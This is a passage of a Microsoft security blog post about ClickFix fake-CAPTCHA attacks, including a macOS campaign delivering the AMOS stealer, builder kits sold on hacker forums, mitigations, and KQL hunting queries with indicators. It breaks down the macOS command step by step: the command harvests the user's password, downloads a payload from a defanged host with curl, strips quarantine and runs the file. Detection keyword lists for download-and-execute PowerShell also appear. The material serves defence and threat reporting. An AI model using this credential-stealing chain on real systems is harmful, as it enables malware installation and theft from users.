<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig27-ClickFix-command.webp" alt="Screenshot of ClickFix command" class="wp-image-141871 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig27-ClickFix-command.webp"><figcaption class="wp-element-caption">Figure 27. Example of a ClickFix command that was using nested PowerShell, string obfuscation through concatenated ampersand (&ldquo;&amp;&rdquo;) delimiters, and benign sounding phrase (for example, &ldquo;Microsoft Defender Services Secure Access&rdquo;)</figcaption></figure>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig28-ClickFix-command.webp" alt="Screenshot of ClickFix command" class="wp-image-141872 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig28-ClickFix-command.webp"><figcaption class="wp-element-caption">Figure 28. Example of a ClickFix command that was using LOLBIN stacking (repeated cmd.exe) and obfuscation through escape characters (^)</figcaption></figure>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig29-ClickFix-command.webp" alt="Screenshot of ClickFix command" class="wp-image-141873 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig29-ClickFix-command.webp"><figcaption class="wp-element-caption">Figure 29. Example of a ClickFix command that was obfuscated using string splitting and concatenation, indexed character access through the $1 command string, and ampersand execution</figcaption></figure>



<h2 class="wp-block-heading" id="beyond-windows-clickfix-targeting-macos-users">Beyond Windows: ClickFix targeting macOS users</h2>



<p class="wp-block-paragraph">In June 2025, a ClickFix campaign was <a href="https://www.cloudsek.com/blog/amos-variant-distributed-via-clickfix-in-spectrum-themed-dynamic-delivery-campaign-by-russian-speaking-hackers">reported</a> to be targeting macOS users to deliver Atomic macOS Stealer (AMOS). This new campaign is yet another mark in the continuously evolving threat landscape, as the ClickFix technique was previously observed to be more common in Windows-based attacks.</p>



<p class="wp-block-paragraph">The campaign, which according to our analysis goes back to late May 2025, redirected target users to Clickfix-themed delivery websites that were impersonating Spectrum, a US-based company that provides services for cable television, internet access, and unified communications:</p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig30-ClickFix-landing-page.webp" alt="Screenshot of fake CAPTCHA" class="wp-image-141874 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig30-ClickFix-landing-page.webp"><figcaption class="wp-element-caption">Figure 30. ClickFix landing page with a fake CAPTCHA</figcaption></figure>



<p class="wp-block-paragraph">Like any other ClickFix campaign, when the user clicks the <strong>Alternate verification</strong> button, the page displays instructions the user has to follow to “fix” their issue. Interestingly, the steps the lure displays even on macOS users are for Windows devices:</p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig31-ClickFix-instructions.webp" alt="Screenshot of ClickFix instructions" class="wp-image-141875 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig31-ClickFix-instructions.webp"><figcaption class="wp-element-caption">Figure 31. ClickFix instructions presented to the target user</figcaption></figure>



<p class="wp-block-paragraph">Meanwhile, in the background, a malicious command is copied to the user’s clipboard. The command that is copied is different for macOS and Windows devices.</p>



<p class="wp-block-paragraph"><strong>Windows:</strong></p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig32-ClickFix-command.webp" alt="Screenshot of ClickFix commands on Windows" class="wp-image-141876 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig32-ClickFix-command.webp"><figcaption class="wp-element-caption">Figure 32. Screenshot of the ClickFix command copied on Windows devices</figcaption></figure>



<p class="wp-block-paragraph"><strong>macOS:</strong></p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig33-ClickFix-command.webp" alt="Screenshot of ClickFix commands on macOS" class="wp-image-141877 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig33-ClickFix-command.webp"><figcaption class="wp-element-caption">Figure 33. Screenshot of the ClickFix command copied on macOS devices</figcaption></figure>



<p class="wp-block-paragraph">The command that’s copied for macOS devices instructs the system to perform the following actions:</p>



<ol class="wp-block-list">
<li class="wp-block-list-item"><strong>Get current user:</strong> <em>username=$(whoami)</em></li>



<li class="wp-block-list-item"><strong>Prompt for the correct password: </strong>Continuously prompt <em>System Password:</em> until the user enters the correct password</li>



<li class="wp-block-list-item"><strong>Validate password:</strong> Use <em>dscl . -authonly</em> to verify the password against macOS directory services</li>



<li class="wp-block-list-item"><strong>Store password:</strong> Save the valid password to the <em>/tmp/.pass</em> file</li>



<li class="wp-block-list-item"><strong>Download payload:</strong> <em>curl -o /tmp/update hxxps[:]//applemacios[.]com/getrur/update</em></li>



<li class="wp-block-list-item"><strong>Remove quarantine:</strong> Use the stolen password with <em>sudo -S xattr -c</em> to bypass macOS security</li>



<li class="wp-block-list-item"><strong>Make an executable file:</strong> <em>chmod +x /tmp/update</em></li>



<li class="wp-block-list-item"><strong>Launch the malware:</strong> Run the downloaded file<em> /tmp/update</em></li>
</ol>



<p class="wp-block-paragraph">The file saved as <em>update</em> within the <em>tmp</em> directory belongs to the AMOS malware family. AMOS variants such as Poseidon and Odyssey are known to steal user information, including browser cookies, passwords, and cryptocurrency wallet credentials.</p>



<h2 class="wp-block-heading" id="behind-the-click-clickfix-kits-and-other-services-for-sale">Behind the click: ClickFix kits and other services for sale</h2>



<p class="wp-block-paragraph">Microsoft Threat Intelligence has observed several threat actors selling the ClickFix builders (also called &#8220;Win + R&#8221;) on popular hacker forums since late 2024. Some of these actors are bundling ClickFix builders into their existing kits that already generate various files such as LNK, JavaScript, and SVG files. The kits offer creation of landing pages with a variety of available lures including Cloudflare. They also offer construction of malicious commands that users will paste into the Windows <em>Run</em> dialog. These kits claim to guarantee antivirus and web protection bypass (some even promise that they can bypass <a href="https://learn.microsoft.com/en-us/windows/security/operating-system-security/virus-and-threat-protection/microsoft-defender-smartscreen/">Microsoft Defender SmartScreen</a>), as well as payload persistence. The cost of subscription to such a service might be between US$200 to US$1,500 per month. We’ve also discovered sellers that offer one-time and piece-meal solutions (for example, only the source code, landing page, or the command line) priced anywhere between US$200 and US$500.</p>



<p class="wp-block-paragraph">Figures 34 and 35 show an example of a ClickFix builder that offers a variety of configurable options such as:</p>



<ul class="wp-block-list">
<li class="wp-block-list-item">Displaying a decoy PDF file after a target user is phished</li>



<li class="wp-block-list-item">Payload execution timing</li>



<li class="wp-block-list-item">Virtual machine (VM) detection and evasion (“Anti VM”) and user access control (UAC) bypass</li>



<li class="wp-block-list-item">Visual template to be used, such as Google Meet, Google CAPTCHA, or Cloudflare</li>



<li class="wp-block-list-item">Language to be used, for example, English, German, Spanish, French, Italian, or Portuguese</li>
</ul>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig34-ClickFix-builder.webp" alt="Screenshot of a ClickFix builder, taken from the seller&rsquo;s demo video" class="wp-image-141878 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig34-ClickFix-builder.webp"><figcaption class="wp-element-caption">Figure 34. Screenshot of a ClickFix builder, taken from the seller&rsquo;s demo video</figcaption></figure>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig35-ClickFix-builder.webp" alt="Screenshot of a ClickFix builder, taken from the seller's demo video" class="wp-image-141879 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig35-ClickFix-builder.webp"><figcaption class="wp-element-caption">Figure 35. Another screenshot of a ClickFix builder, taken from the seller&#8217;s demo video</figcaption></figure>



<h2 class="wp-block-heading" id="clickfix-protection-and-detection">ClickFix protection and detection</h2>



<p class="wp-block-paragraph"><a href="https://www.microsoft.com/en-us/security/business/solutions/extended-detection-response-xdr">Microsoft Defender XDR</a> offers comprehensive coverage for ClickFix attacks by leveraging a range of available technologies across different attack layers. For example, Microsoft Defender SmartScreen displays a warning to Microsoft Edge users when they visit a ClickFix landing page:</p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig36-SmartScreen.webp" alt="Screenshot of Microsoft Defender SmartScreen flagging a ClickFix landing page" class="wp-image-141880 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig36-SmartScreen.webp"><figcaption class="wp-element-caption">Figure 36. Microsoft Defender SmartScreen flagging a ClickFix landing page</figcaption></figure>



<p class="wp-block-paragraph">Even if a user chooses to bypass the SmartScreen warning or is using a different web browser and is socially engineered to execute a command in the <em>Run</em> dialog, <a href="https://www.microsoft.com/en-us/security/business/endpoint-security/microsoft-defender-endpoint">Microsoft Defender for Endpoint</a> detects and mitigates the attacks initial access activities like the suspicious process execution and command-line activity during the process scan phase.</p>



<p class="wp-block-paragraph">Most attack paths eventually lead to the execution of either PowerShell or HTA scripts. Microsoft’s <a href="https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal#purpose">Antimalware Scan Interface (AMSI)</a> provides scanning capabilities for both scripting environments and PowerShell applications. Defender’s <a href="https://learn.microsoft.com/en-us/defender-endpoint/cloud-protection-microsoft-defender-antivirus">Cloud Protection</a> delivers enhanced protection by monitoring and intercepting outgoing connections to malicious URLs as well as analyzing process execution patterns. Additionally, <a href="https://www.microsoft.com/en-us/security/business/siem-and-xdr/microsoft-defender-office-365">Microsoft Defender for Office 365</a> analyzes end-to-end links and HTML attachments, and has fake CAPTCHA behavioral signatures that proactively block ClickFix-related phishing emails.</p>



<h3 class="wp-block-heading" id="additional-attack-chain-coverage-with-network-protection">Additional attack chain coverage with network protection</h3>



<p class="wp-block-paragraph">In early 2025, Microsoft Defender Experts observed thousands of devices being affected by a ClickFix attack (that is, the ClickFix command was executed by a user on the device) per month, even with an endpoint detection and response (EDR) solution enabled. Due to this, our researchers performed pattern-of-life analysis to follow the tactics, techniques, and procedures (TTPs) in the attack timeline and understand the gaps that can be filled so that the attack could be stopped at the initial access stage. Their research resulted in the automation of the analysis and collection of numerous obfuscated/encoded LOLBin commands observed in the <em>RunMRU</em> registry, and they were able to successfully extract and block newly created malicious domainsthrough Defender for Endpoint’s <a href="https://learn.microsoft.com/en-us/defender-endpoint/network-protection">network protection feature</a>. This feature is an important component on the protection against ClickFix because blocking the C2 domains early in the attack chain prevents the download and/or execution of first-stage payloads, effectively making the attack unsuccessful.</p>



<h2 class="wp-block-heading" id="recommendations">Recommendations</h2>



<p class="wp-block-paragraph">Microsoft Threat Intelligence recommends the following mitigations to reduce the impact of this threat.</p>



<ul class="wp-block-list">
<li class="wp-block-list-item">Educate users to identify social engineering attacks.</li>



<li class="wp-block-list-item">Ensure users are aware of what they copy and paste.</li>



<li class="wp-block-list-item">Check your Microsoft 365 email filtering settings to ensure spoofed emails, spam, and emails with malware are blocked. Use <a href="https://learn.microsoft.com/defender-office-365/mdo-about">Microsoft Defender for Office 365</a> for enhanced phishing protection and coverage against new threats and polymorphic variants. Configure Defender for Office 365 to <a href="https://learn.microsoft.com/defender-office-365/safe-links-about">recheck links on click</a> and <a href="https://learn.microsoft.com/defender-office-365/zero-hour-auto-purge">delete sent mail</a> in response to newly acquired threat intelligence. Turn on <a href="https://learn.microsoft.com/defender-office-365/safe-attachments-about">safe attachments policies</a> to check attachments to inbound email.</li>



<li class="wp-block-list-item">Consider using <a href="https://learn.microsoft.com/deployedge/microsoft-edge-for-business">enterprise-managed browsers</a>, which provide multiple security features including security update requirements and <a href="https://learn.microsoft.com/deployedge/microsoft-edge-for-business-config-recommendations">data compliance policies</a>.</li>



<li class="wp-block-list-item">Block web pages from automatically running Flash plugins.</li>



<li class="wp-block-list-item">Enable <a href="https://learn.microsoft.com/defender-endpoint/network-protection">network protection</a> and <a href="https://learn.microsoft.com/defender-endpoint/web-protection-overview">web protection</a> in Microsoft Defender for Endpoint to safeguard against malicious sites and internet-based threats.</li>



<li class="wp-block-list-item">Encourage users to use Microsoft Edge and other web browsers that support <a href="https://learn.microsoft.com/microsoft-365/security/defender-endpoint/web-protection-overview?ocid=magicti_ta_learndoc">Microsoft Defender SmartScreen</a>, which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that host malware.</li>



<li class="wp-block-list-item">Turn on <a href="https://learn.microsoft.com/microsoft-365/security/defender-endpoint/configure-block-at-first-sight-microsoft-defender-antivirus?ocid=magicti_ta_learndoc">cloud-delivered protection</a> in Microsoft Defender Antivirus, or the equivalent for your antivirus product, to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a majority of new and unknown variants.</li>



<li class="wp-block-list-item">Enable PowerShell <a href="https://learn.microsoft.com/en-us/powershell/scripting/security/security-features?view=powershell-7.5">script block logging</a> to detect and analyze obfuscated or encoded commands, providing visibility into malicious script execution that might otherwise evade traditional logging.</li>



<li class="wp-block-list-item">Use PowerShell <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.5">execution policies</a> such as setting <em>AllSigned</em> or <em>RemoteSigned </em>tohelp reduce the risk of malicious execution by ensuring only trusted, signed scripts are executed, adding a layer of control.</li>



<li class="wp-block-list-item">Use Group Policy to deploy hardening configurations throughout your environment, if certain features are not necessary:<ul><li>Disable the <em>Run</em> dialog box (<em>Win + R</em>) key and remove the <em>Run</em> option from the <em>Start</em> Menu by selecting <strong>User Configuration</strong> &gt; <strong>Administrative Templates</strong> &gt; <strong>Start Menu and Taskbar</strong> &gt; <strong>Remove Run menu from Start Menu</strong>.</li></ul><ul><li>Create an <a href="https://learn.microsoft.com/windows/security/application-security/application-control/app-control-for-business/appcontrol-and-applocker-overview">App Control policy</a> that prohibits the launch of native Windows binaries from <em>Run</em>. This can be accomplished by defining a rule based on the specific process that is launching binaries like PowerShell.</li></ul>
<ul class="wp-block-list">
<li class="wp-block-list-item"><a href="https://learn.microsoft.com/windows/terminal/group-policy">Configure Windows Terminal</a> access and settings <a href="https://learn.microsoft.com/windows/terminal/customize-settings/interaction">to warn users when the text they’re pasting contains multiple lines</a>.</li>
</ul>
</li>
</ul>



<p class="wp-block-paragraph">Microsoft Defender XDR customers can also implement the following <a href="https://learn.microsoft.com/defender-endpoint/attack-surface-reduction-rules-deployment-implement">attack surface reduction rules</a> to harden an environment against PowerShell techniques used by threat actors:</p>



<ul class="wp-block-list">
<li class="wp-block-list-item"><a href="https://learn.microsoft.com/defender-endpoint/attack-surface-reduction-rules-reference">Block execution of potentially obfuscated scripts</a></li>



<li class="wp-block-list-item"><a href="https://learn.microsoft.com/defender-endpoint/attack-surface-reduction-rules-reference">Block executable files from running unless they meet a prevalence, age, or trusted list criterion</a></li>



<li class="wp-block-list-item"><a href="https://learn.microsoft.com/defender-endpoint/attack-surface-reduction-rules-reference">Block JavaScript or VBScript from launching downloaded executable content</a></li>
</ul>



<h2 class="wp-block-heading" id="microsoft-defender-xdr-detections">Microsoft Defender XDR detections</h2>



<p class="wp-block-paragraph">Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, apps to provide integrated protection against attacks like the threat discussed in this blog.</p>



<p class="wp-block-paragraph">Customers with provisioned access can also use <a href="https://learn.microsoft.com/en-us/defender-xdr/security-copilot-in-microsoft-365-defender">Microsoft Security Copilot in Microsoft Defender</a> to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence.</p>



<p class="wp-block-paragraph">Microsoft Defender Antivirus</p>



<p class="wp-block-paragraph">Microsoft Defender Antivirus detects this threat as the following malware:</p>



<ul class="wp-block-list">
<li class="wp-block-list-item"><a href="https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Behavior:Win32/ClickFix.ZAB">Behavior:Win32/ClickFix</a></li>



<li class="wp-block-list-item"><a href="https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Behavior:Win32/ClickFix.ZAB">Behavior:Win32/SuspClickFix</a></li>



<li class="wp-block-list-item"><a href="https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Trojan:Win32/ClickFix.SEC">Trojan:Win32/ClickFix</a></li>



<li class="wp-block-list-item">Trojan:Script/ClickFix</li>



<li class="wp-block-list-item"><a href="https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Behavior:Win32/RegRunMRU.SA">Behavior:Win32/RegRunMRU</a></li>



<li class="wp-block-list-item"><a href="https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Trojan:HTML/FakeCaptcha!rfn">Trojan:HTML/FakeCaptcha</a></li>
</ul>



<h3 class="wp-block-heading" id="microsoft-defender-for-endpoint">Microsoft Defender for Endpoint</h3>



<p class="wp-block-paragraph">The following Microsoft Defender for Endpoint alerts might also indicate threat activity related to this threat. Note, however, that these alerts can be also triggered by unrelated threat activity:</p>



<ul class="wp-block-list">
<li class="wp-block-list-item">Suspicious command in RunMRU registry</li>



<li class="wp-block-list-item">Use of living-off-the-land binary to run malicious code</li>



<li class="wp-block-list-item">Suspicious process executed PowerShell command</li>



<li class="wp-block-list-item">Suspicious PowerShell command line</li>



<li class="wp-block-list-item">Suspicious &#8216;SuspClickFix&#8217; behavior was blocked</li>



<li class="wp-block-list-item">An active &#8216;SuspDown&#8217; malware was prevented from executing via AMSI</li>



<li class="wp-block-list-item">Suspicious &#8216;MaleficAms&#8217; behavior was blocked</li>



<li class="wp-block-list-item">An active &#8216;ClickFix&#8217; malware in a command line was prevented from executing</li>



<li class="wp-block-list-item">&#8216;ClickFix&#8217; malware was prevented</li>



<li class="wp-block-list-item">Information stealing malware activity</li>



<li class="wp-block-list-item">Powershell made a suspicious network connection</li>



<li class="wp-block-list-item">Suspicious process launch by Rundll32.exe</li>



<li class="wp-block-list-item">Suspicious Rundll32 command-line</li>



<li class="wp-block-list-item">Suspicious Scheduled Task Process Launched</li>
</ul>



<h3 class="wp-block-heading" id="microsoft-defender-for-office-365">Microsoft Defender for Office 365</h3>



<p class="wp-block-paragraph">Microsoft Defender for Office 365 detects malicious activity associated with this threat through the following alerts:</p>



<ul class="wp-block-list">
<li class="wp-block-list-item">A potentially malicious URL click was detected</li>



<li class="wp-block-list-item">Email messages containing malicious URL removed after delivery</li>



<li class="wp-block-list-item">Email messages removed after delivery</li>



<li class="wp-block-list-item">A user clicked through to a potentially malicious URL</li>



<li class="wp-block-list-item">Suspicious email sending patterns detected</li>



<li class="wp-block-list-item">Email reported by user as malware or phish</li>
</ul>



<h2 class="wp-block-heading" id="microsoft-security-copilot">Microsoft Security Copilot</h2>



<p class="wp-block-paragraph">Security Copilot customers can use the standalone experience to <a href="https://learn.microsoft.com/en-us/copilot/security/prompting-security-copilot#create-your-own-prompts">create their own prompts</a> or run the following <a href="https://learn.microsoft.com/en-us/copilot/security/using-promptbooks">pre-built promptbooks</a> to automate incident response or investigation tasks related to this threat:</p>



<ul class="wp-block-list">
<li class="wp-block-list-item">Check impact of an external threat article</li>



<li class="wp-block-list-item">Suspicious script analysis</li>



<li class="wp-block-list-item">Threat actor profile</li>



<li class="wp-block-list-item">Threat Intelligence 360 report based on MDTI article</li>



<li class="wp-block-list-item">Vulnerability impact assessment</li>
</ul>



<p class="wp-block-paragraph">Note that some promptbooks require access to plugins for Microsoft products such as Microsoft Defender XDR or Microsoft Sentinel.</p>



<h2 class="wp-block-heading" id="threat-intelligence-reports">Threat intelligence reports</h2>



<p class="wp-block-paragraph">Microsoft customers can use the following reports in Microsoft products to get the most up-to-date information about the threat actor, malicious activity, and techniques discussed in this blog. These reports provide the intelligence, protection information, and recommended actions to prevent, mitigate, or respond to associated threats found in customer environments.</p>



<h3 class="wp-block-heading" id="microsoft-defender-threat-intelligence">Microsoft Defender Threat Intelligence</h3>



<ul class="wp-block-list">
<li class="wp-block-list-item"><a href="https://security.microsoft.com/threatanalytics3/57d43abe-28c3-4f9d-af11-30f51d6bb03c">DarkGate malware samples delivered through fake Notion websites followed by ClickFix technique</a></li>



<li class="wp-block-list-item"><a href="https://security.microsoft.com/threatanalytics3/939493e1-2ebc-403e-b3fc-0246be4cc88b">ClickFix and spoofed IT apps deliver RATs via Node.js over Cloudflare Quick Tunnels</a></li>



<li class="wp-block-list-item"><a href="https://security.microsoft.com/threatanalytics3/a35f0e20-be8d-4c5c-b12a-3775b546d3e0">Phishing campaign impersonates Booking.com, delivers multiple commodity malware types</a></li>



<li class="wp-block-list-item"><a href="https://security.microsoft.com/threatanalytics3/640d3a2d-f0a5-4ed4-8ed0-2dea7a3bb8e0">Storm-1877 evolving tactics to target users with ClickFix attacks</a></li>



<li class="wp-block-list-item"><a href="https://security.microsoft.com/threatanalytics3/955c7bdb-c5fa-40b4-90f4-6666cce5b8b3">Email phishing campaign leads to Xworm</a></li>



<li class="wp-block-list-item"><a href="https://security.microsoft.com/intel-explorer/articles/efc9e757">ClickFix technique leverages clipboard to run malicious commands</a></li>



<li class="wp-block-list-item"><a href="https://security.microsoft.com/intel-explorer/articles/2f3ef2f1">Lampion Is Back With ClickFix Lures</a></li>
</ul>



<p class="wp-block-paragraph">Microsoft Security Copilot customers can also use the <a href="https://learn.microsoft.com/defender/threat-intelligence/security-copilot-and-defender-threat-intelligence?bc=%2Fsecurity-copilot%2Fbreadcrumb%2Ftoc.json&amp;toc=%2Fsecurity-copilot%2Ftoc.json#turn-on-the-security-copilot-integration-in-defender-ti">Microsoft Security Copilot integration</a> in Microsoft Defender Threat Intelligence, either in the Security Copilot standalone portal or in the <a href="https://learn.microsoft.com/defender/threat-intelligence/using-copilot-threat-intelligence-defender-xdr">embedded experience</a> in the Microsoft Defender portal to get more information about this threat actor.</p>



<h2 class="wp-block-heading" id="hunting-queries">Hunting queries</h2>



<h3 class="wp-block-heading" id="microsoft-defender-xdr">Microsoft Defender XDR</h3>



<p class="wp-block-paragraph">Microsoft Defender XDR customers can run the following query to find related activity in their networks:</p>



<p class="wp-block-paragraph"><strong>ClickFix commands execution</strong></p>



<p class="wp-block-paragraph">Identify ClickFix commands execution.</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: plain; auto-links: false; gutter: false; title: ; quick-code: false; notranslate" title="">
DeviceRegistryEvents
| where ActionType =~ "RegistryValueSet"
| where InitiatingProcessFileName =~ "explorer.exe"
| where RegistryKey has @"\CurrentVersion\Explorer\RunMRU"
| where RegistryValueData has "✅"
        or (RegistryValueData has_any ("powershell", "mshta", "curl", "msiexec", "^")
             and RegistryValueData matches regex "&#x5B;\u0400-\u04FF\u0370-\u03FF\u0590-\u05FF\u0600-\u06FF\u0E00-\u0E7F\u2C80-\u2CFF\u13A0-\u13FF\u0530-\u058F\u10A0-\u10FF\u0900-\u097F]")
        or (RegistryValueData has "mshta" and RegistryValueName !~ "MRUList" and RegistryValueData !in~ ("mshta.exe\\1", "mshta\\1"))
        or (RegistryValueData has_any ("bitsadmin", "forfiles", "ProxyCommand=") and RegistryValueName !~ "MRUList")
        or ((RegistryValueData startswith "cmd" or RegistryValueData startswith "powershell")
            and (RegistryValueData has_any ("-W Hidden ", " -eC ", "curl", "E:jscript", "ssh", "Invoke-Expression", "UtcNow", "Floor", "DownloadString", "DownloadFile", "FromBase64String",  "System.IO.Compression", "System.IO.MemoryStream", "iex", "Invoke-WebRequest", "iwr", "Get-ADDomainController", "InstallProduct", "-w h", "-X POST", "Invoke-RestMethod", "-NoP -W", ".InVOKe", "-useb", "irm ", "^", "&#x5B;char]", "&#x5B;scriptblock]", "-UserAgent", "UseBasicParsing", ".Content")
              or RegistryValueData matches regex @"&#x5B;-/–]&#x5B;Ee^]{1,2}&#x5B;NnCcOoDdEeMmAa^]*\s&#x5B;A-Za-z0-9+/=]{15,}"))
</pre></div>


<p class="wp-block-paragraph"><strong>Lampion malware activity</strong>&nbsp;</p>



<p class="wp-block-paragraph">The following query searches for PowerShell command associated with Lampion malware activity that is used to download malicious files.</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: plain; auto-links: false; gutter: false; title: ; quick-code: false; notranslate" title="">
DeviceProcessEvents 
| where InitiatingProcessFileName == "powershell.exe" 
| where InitiatingProcessParentFileName == "explorer.exe" 
| where FileName has_any ("WScript.exe") 
| where ProcessCommandLine contains "\"PowerShell.exe\" -windowstyle minimized -Command" 
and ProcessCommandLine has "Invoke-WebRequest"
</pre></div>


<h3 class="wp-block-heading" id="microsoft-sentinel">Microsoft Sentinel</h3>



<p class="wp-block-paragraph">Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with ‘TI map’) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace. If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the <a href="https://learn.microsoft.com/azure/sentinel/sentinel-solutions-deploy">Microsoft Sentinel Content Hub</a> to have the analytics rule deployed in their Sentinel workspace.</p>



<p class="wp-block-paragraph">Below are the queries using&nbsp;<a href="https://learn.microsoft.com/azure/sentinel/normalization">Sentinel Advanced Security Information Model (ASIM) functions</a>&nbsp;to hunt threats across both Microsoft first-party and third-party data sources. ASIM also supports deploying parsers to specific workspaces&nbsp;<a href="https://aka.ms/DeployASIM">from GitHub</a>, using an ARM template or manually</p>



<p class="wp-block-paragraph"><strong>Detect network IP and domain indicators of compromise using ASIM</strong></p>



<p class="wp-block-paragraph">The following query checks IP addresses and domain IOCs across data sources supported by ASIM network session parser:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: plain; auto-links: false; gutter: false; title: ; quick-code: false; notranslate" title="">
//IP list and domain list- _Im_NetworkSession
let lookback = 30d;
let ioc_ip_addr = dynamic(&#x5B;"185.234.72.186", "45.94.31.176", "3.138.123.13", "16.171.23.221", "3.23.103.13", "83.242.96.159", "5.8.9.77"]);
let ioc_domains = dynamic(&#x5B;"mein-lonos-cloude.de", "derko-meru.online", "objectstorage.ap-singapore-2.oraclecloud.com", "tesra.shop", "zzzp.live", "cqsf.live", "access-ssa-gov.es", "binancepizza.info", "panel-spectrum.net"]);
_Im_NetworkSession(starttime=todatetime(ago(lookback)), endtime=now())
| where DstIpAddr in (ioc_ip_addr) or DstDomain has_any (ioc_domains)
| summarize imNWS_mintime=min(TimeGenerated), imNWS_maxtime=max(TimeGenerated),
  EventCount=count() by SrcIpAddr, DstIpAddr, DstDomain, Dvc, EventProduct, EventVendor
</pre></div>


<p class="wp-block-paragraph"><strong>Detect network and files hashes indicators of compromise using ASIM</strong></p>



<p class="wp-block-paragraph">The following query checks IP addresses, domains, and file hash IOCs across data sources supported by ASIM web session parser:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: plain; auto-links: false; gutter: false; title: ; quick-code: false; notranslate" title="">
//IP list - _Im_WebSession
let lookback = 30d;
let ioc_ip_addr = dynamic(&#x5B;"185.234.72.186", "45.94.31.176", "3.138.123.13", "16.171.23.221", "3.23.103.13", "83.242.96.159", "5.8.9.77"]);
let ioc_sha_hashes =dynamic(&#x5B;"061d378ffed42913d537da177de5321c67178e27e26fca9337e472384d2798c8", "592ef7705b9b91e37653f9d376b5492b08b2e033888ed54a0fd08ab043114718", "8fb329ae6b590c545c242f0bef98191965f7afed42352a0c84ca3ccc63f68629", "d9ffe7d433d715a2bf9a31168656e965b893535ab2e2d9cab81d99f0ce0d10c9", "f77c924244765351609777434e0e51603e7b84c5a13eef7d5ec730823fc5ebab"]);
_Im_WebSession(starttime=todatetime(ago(lookback)), endtime=now())
| where DstIpAddr in (ioc_ip_addr) or FileSHA256 in (ioc_sha_hashes)
| summarize imWS_mintime=min(TimeGenerated), imWS_maxtime=max(TimeGenerated),
  EventCount=count() by SrcIpAddr, DstIpAddr, Url, Dvc, EventProduct, EventVendor

// Domain list - _Im_WebSession
let ioc_domains = dynamic(&#x5B;"mein-lonos-cloude.de", "derko-meru.online", "objectstorage.ap-singapore-2.oraclecloud.com", "tesra.shop", "zzzp.live", "cqsf.live", "access-ssa-gov.es", "binancepizza.info", "panel-spectrum.net"]);
_Im_WebSession (url_has_any = ioc_domains)
</pre></div>


<p class="wp-block-paragraph"><strong>Detect files hashes indicators of compromise using ASIM</strong></p>



<p class="wp-block-paragraph">The following query checks IP addresses and file hash IOCs across data sources supported by ASIM file event parser:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: plain; auto-links: false; gutter: false; title: ; quick-code: false; notranslate" title="">
// file hash list - imFileEvent
let ioc_sha_hashes = dynamic(&#x5B;"061d378ffed42913d537da177de5321c67178e27e26fca9337e472384d2798c8", "592ef7705b9b91e37653f9d376b5492b08b2e033888ed54a0fd08ab043114718", "8fb329ae6b590c545c242f0bef98191965f7afed42352a0c84ca3ccc63f68629", "d9ffe7d433d715a2bf9a31168656e965b893535ab2e2d9cab81d99f0ce0d10c9", "f77c924244765351609777434e0e51603e7b84c5a13eef7d5ec730823fc5ebab"]);
imFileEvent
| where SrcFileSHA256 in (ioc_sha_hashes) or
TargetFileSHA256 in (ioc_sha_hashes)
| extend AccountName = tostring(split(User, @'')&#x5B;1]), 
  AccountNTDomain = tostring(split(User, @'')&#x5B;0])
| extend AlgorithmType = "SHA256"
</pre></div>

<script id="uhf-footer-ccpa">
